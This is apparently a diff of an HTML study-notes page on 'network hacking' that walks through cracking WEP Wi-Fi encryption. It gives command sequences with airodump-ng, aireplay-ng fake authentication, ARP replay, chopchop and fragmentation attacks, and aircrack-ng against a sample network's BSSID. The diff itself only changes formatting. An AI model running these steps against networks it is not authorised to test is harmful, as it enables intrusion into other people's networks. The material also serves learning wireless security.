@@ -1,6 +1,7 @@
-<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
 <head>
-<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <title>WEP</title>
 </head><body><b><span style="font-size: 12pt">NETWORK HACKING:<br/>
 <br/>
@@ -25,7 +26,7 @@ C-Post-Connection Attacks<br/>
 -The initialization vector is only 24 bits!<br/>
 -IV+key(password used to connect network)=key stream<br/>
 ex:<br/>
-keystream+&quot;Data to send to the router&quot;=ASDKASDIASDJA<br/>
+keystream+"Data to send to the router"=ASDKASDIASDJA<br/>
 <br/>
 <b>WEP WEAKNESSES:<br/>
 <br/>
@@ -51,7 +52,7 @@ keystream+&quot;Data to send to the router&quot;=ASDKASDIASDJA<br/>
 in another shell in terminator:<br/>
 #aircrack-ng basic_wep-01.cap<br/>
 <br/>
-N<b>ote:</b>this method succeed when #Data is large that's mean it's busy network and this good to hack WEP<br/>
+N<b>ote:</b>&nbsp;this method succeed when #Data is large that's mean it's busy network and this good to hack WEP<br/>
 <br/>
 <br/>
 <br/>
@@ -70,13 +71,13 @@ N<b>ote:</b>this method succeed when #Data is large that's mean it's busy networ
 <b>Solution:</b><br/>
 --&gt;Associate(mean i want to connect you) with the AP before launching the attack and force number of data to increase very very quickly<br/>
 <br/>
-<b>ex,</b>consider HEMA network is WEP we want to hack:<br/>
+<b>ex,</b>&nbsp;consider HEMA network is WEP we want to hack:<br/>
 <br/>
 #airodump-ng wlan0 (discovering all wireless networks)ctrl+c<br/>
 #airodump-ng --bssid 58:7F:66:3F:61:E0 --channel 9 --write arpreplay wlan0<br/>
 ---------------------------------------------------------------------------------<br/>
 in another shell<br/>
-#ifconfig (to know MAC address of your wifi adapter, it's first 12 digits after the &quot;unspec&quot;)<br/>
+#ifconfig (to know MAC address of your wifi adapter, it's first 12 digits after the "unspec")<br/>
 #aireplay-ng --fakeauth 30 -a 58:7F:66:3F:61:E0 -h D0:37:45:71:10:56 wlan0 (aireplay-ng to associate every 30 seconds)<br/>
 ----------------------------------------------------------------------------------<br/>
 in another shell<br/>
@@ -95,9 +96,9 @@ you can write this in ifconfig shell after #data reach 50000:<br/>
 -This causes the AP to produce another packet with a new IV<br/>
 -Keep doing this till we have enough IVs to crack the key<br/>
 <br/>
-<b>ARP:</b><div style="text-align: left"><span style="font-family: arial">The Address Resolution Protocol is a communication protocol used for discovering the link layer address, such as a MAC address, associated with a given internet layer address, typically an IPv4 address. This mapping is a critical function in the Internet protocol</span></div> <br/>
+<b>ARP:</b>&nbsp;<div style="text-align: left"><span style="font-family: arial">The Address Resolution Protocol is a communication protocol used for discovering the link layer address, such as a MAC address, associated with a given internet layer address, typically an IPv4 address. This mapping is a critical function in the Internet protocol</span></div>&nbsp; <br/>
 <br/>
-<img src="wep-arp.png"/><br/>
+<img src="wep-arp.png" /><br/>
 <br/>
 <br/>
 <br/>
@@ -114,13 +115,13 @@ you can write this in ifconfig shell after #data reach 50000:<br/>
 3-Inject it in the traffic<br/>
 <br/>
 <br/>
-<b>ex,</b>consider HEMA network is WEP we want to hack:<br/>
+<b>ex,</b>&nbsp;consider HEMA network is WEP we want to hack:<br/>
 <br/>
 #airodump-ng wlan0 (discovering all wireless networks)ctrl+c<br/>
 #airodump-ng --bssid 58:7F:66:3F:61:E0 --channel 9 --write chopchop-test wlan0<br/>
 ---------------------------------------------------------------------------------<br/>
 in another shell<br/>
-#ifconfig (to know MAC address of your wifi adapter, it's first 12 digits after the &quot;unspec&quot;)<br/>
+#ifconfig (to know MAC address of your wifi adapter, it's first 12 digits after the "unspec")<br/>
 #aireplay-ng --fakeauth 30 -a 58:7F:66:3F:61:E0 -h D0:37:45:71:10:56 wlan0 (aireplay-ng to associate every 30 seconds)<br/>
 ----------------------------------------------------------------------------------<br/>
 in another shell<br/>
@@ -141,13 +142,13 @@ you can write it in ifconfig shell:<br/>
 <br/>
 </b><b>--&gt;</b>The goal of this method is to obtain 1500 bytes of the PRGA(Pseudo Random Generation Algorithm), this can be used to forge a new packet which can be injected into the traffic to generate new IV's<br/>
 <br/>
-<b>ex,</b>consider HEMA network is WEP we want to hack:<br/>
+<b>ex,</b>&nbsp;consider HEMA network is WEP we want to hack:<br/>
 <br/>
 #airodump-ng wlan0 (discovering all wireless networks)ctrl+c<br/>
 #airodump-ng --bssid 58:7F:66:3F:61:E0 --channel 9 --write fragment-test wlan0<br/>
 ---------------------------------------------------------------------------------<br/>
 in another shell<br/>
-#ifconfig (to know MAC address of your wifi adapter, it's first 12 digits after the &quot;unspec&quot;)<br/>
+#ifconfig (to know MAC address of your wifi adapter, it's first 12 digits after the "unspec")<br/>
 #aireplay-ng --fakeauth 30 -a 58:7F:66:3F:61:E0 -h D0:37:45:71:10:56 wlan0 (aireplay-ng to associate every 30 seconds)<br/>
 ----------------------------------------------------------------------------------<br/>
 in another shell<br/>
